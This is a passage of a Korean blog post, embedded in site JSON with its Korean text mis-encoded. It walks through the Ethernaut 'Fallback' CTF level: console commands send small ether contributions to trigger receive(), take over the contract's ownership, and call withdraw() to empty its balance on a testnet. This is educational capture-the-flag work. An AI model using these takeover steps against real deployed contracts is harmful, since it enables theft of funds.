punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//ë‚˜ì˜ contributionì„ í™•ì¸í•œë‹¤.</span>\n<span class=\"token function\">fromWei</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//contractì˜ balanceë¥¼ í™•ì¸í•œë‹¤.</span>\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//ëª¨ë‘ 0.0001ê³¼ ê°™ì„ ê²ƒì´ë‹¤!</span>\n\n<span class=\"token comment\">//ë‚˜ì˜ contributionì´ 0ì„ ì´ˆê³¼í–ˆìœ¼ë‹ˆ recevice()ë¥¼ ì‹¤í–‰ ì‹œí‚¬ ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œë‹¤.</span>\ncontract<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//contractì˜ owner addressë¥¼ í™•ì¸í•œë‹¤.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//ë‚˜ì˜ addressë¥¼ í™•ì¸í•œë‹¤.</span>\nplayer\n<span class=\"token comment\">//play(ë‚˜)ì´ ownerê°€ ëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</span>\n</code></pre></div>\n<p>ì´ë ‡ê²Œ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆì—ˆë‹¤.</p>\n<p>ë‹¤ìŒìœ¼ë¡œ contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°ì´ë‹¤.\ncontractì˜ balanceë¥¼ 0ì„ë¡œ ë§Œë“¤ê¸°ëŠ” ë§¤ìš° ì‰½ë‹¤!\nownerë§Œ callí•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ì¸ withdrawì„ callí•˜ê¸°ë§Œ í•˜ë©´ ëœë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//withdrawí•œë‹¤.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">//contractì˜ balanceê°€ 0ì´ ëœê²ƒì„ í™•ì¸í•œë‹¤.</span>\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span></code></pre></div>\n<p>Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ë‹¤ìŒê³¼ ê°™ì´ ëœ¨ë©´ì„œ ë‹¤ìŒ levelë¡œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAACfklEQVQ4y1WTiY7jNhBE/f/fFSBAkGMm4x2P14csWfdFirRknf0CUd5kI6BR7KJUeA1Su9Oh4nRQ3L2GKDD4l4bLUbkKfYN31jS6Z32WRZwWpsfLH9yKB5fUOq0fA9M0sbvdevxg4B4ORPGAf++5XHuuXk+UDPhBj7EzICzL4rQ0Pdf8gVc8XHBQtpS2Z5pGdn/uhb++Cfuj8HUR3g/Cb+8Lv38Ih7Pw9imUSl6BG2FYdbz7mo9A8+YrvoUNsXpuhOcUThmENcQKggq8Aq7F5t1KaLr/B64097LlXrWOcF3rdtgIL2bAsyM3O3F/TFztyLEZOZnx396MC8h/gXnz5HtiOKeWU2q5Zpa86TfCTwk4SMh3ibhKylEiPsRnLz4XSfmSkFrsCsgiiwuM686N+Rk17O+aY2zI9GvkTG7k4pGLTyUxpdzJ5UYiZ6drryShE8MLkMr27iDWkdcTXlX9GFnPH5j5gJn/Rs9v2PmImv+gmn+lnH7Bznv0/I6Zj8jcrJeHVD8d3VdsOESGU2Kc5wgZLzD5MH7B5CFT+OqPMJ0R59+ct0weSEFlOvyidZSOsGxRP+6h9BXS12yqtvXQvPoKaWNkWD3tir5At08i1ROrjqjuSPQT3Y6vQBUjOkZUuGkVILbYtPKR/IwUHqITt4+OsXlCqVuqx+D+msoOtP38CmwKxFSIyhBbI02JdHbzTL3VuvfqeSi6KqepFcZ2NN2I6Ub6acFay050sYWsutZPH0u1UuVIESHlOkUOVtFkKfHlSpKUbtz1ypjnRNM07CRNkSxH4gRJUiTNkCxDqgoJIyTPkSBAgjvruxQFY5rz9AKepaIbJp7DzLSIC/wHAO0qYjzyzD0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"fallback finish\"\n        title=\"fallback finish\"\n        src=\"/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png\"\n        srcset=\"/static/68592aa21598d925b557a56b988fc3bf/e9ff0/fallback_finish.png 180w,\n/static/68592aa21598d925b557a56b988fc3bf/f21e7/fallback_finish.png 360w,\n/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png 720w,\n/static/68592aa21598d925b557a56b988fc3bf/4b446/fallback_finish.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì–¼ë§ˆì „ì— ê³µë¶€í–ˆë˜ king of Ether(DOS with unexpected revert)ê°€ ìƒê°ë‚œë‹¤. revertë¥¼ í†µí•´ í•˜ëŠ” ownershipì„ ê°€ì ¸ì˜¤ëŠ”ê±´ ì•„ë‹ˆì—ˆì§€ë§Œ ë¹„ìŠ·í•œ ì ì´ ë§ì€ ê²ƒ ê°™ì•˜ë‹¤. smart contractì„ ì§¤ë•Œ logicì€ ê´œì°®ì•„ë³´ì—¬ë„ ìš°ë¦¬ê°€ ìƒê°í•˜ì§€ ëª»í•œ í—ˆì ì´ ìˆì„ ìˆ˜ ìˆë‹¤! í•­ìƒ ì¡°ì‹¬í•˜ê³  ë˜ ì¡°ì‹¬í•˜ì!\në‚˜ì¤‘ì—ëŠ” ë³´ì•ˆê°ì‚¬(auditing)ë„ ë°°ì›Œ ë‚´ì˜ smart contractë¥¼ audit í•  ìˆ˜ ìˆì—ˆìœ¼ë©´ ì¢‹ê² ë‹¤! <del>ì´ê±°ë¡œ ì·¨ì—… í•´ì•¼ì§€ã…</del></p>\n<p>ê³ ì‘ 1ë‹¨ê³„ë¥¼ ì™„ë£Œí•œ ê²ƒì´ì§€ë§Œ ê²Œì„ì„ í†µí•´ ë°°ìš°ë‹ˆ ë” ì¬ë°ŒëŠ” ê²ƒ ê°™ë‹¤. ì•ìœ¼ë¡œë„ í™”ì´íŒ…!</p>\n<hr>\n<h2 id=\"ê¸°íƒ€-ì •ë³´\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"ê¸°íƒ€ ì •ë³´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ê¸°íƒ€ ì •ë³´</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">ê¸°íƒ€ ì •ë³´</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 02, 2022","title":"(Ethernaut ì·¨ì•½ì  1) Fallback","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/","nextSlug":"/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/","prevSlug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}